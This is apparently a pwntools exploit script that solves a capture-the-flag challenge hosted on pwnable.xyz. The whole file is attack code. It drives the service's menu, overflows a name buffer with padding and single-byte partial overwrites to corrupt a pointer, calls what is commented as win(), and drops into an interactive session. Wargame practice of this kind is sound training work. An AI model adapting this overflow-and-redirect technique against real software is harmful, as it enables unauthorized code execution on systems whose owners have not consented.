from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30023)

sla = r.sendlineafter
sa = r.sendafter

sla('> ', '1')
sa('name: ', 'A' * 0x20)

sla('> ', '2')
sla('index: ', '0')
sa('name: ', 'A' * 0x20 + chr(0x29))

sla('> ', '2')
sla('index: ', '0')
sa('name: ', 'A' * 0x28 + chr(0x2c))

sla('> ', '3')
sla('index: ', '0') # call win()

r.interactive()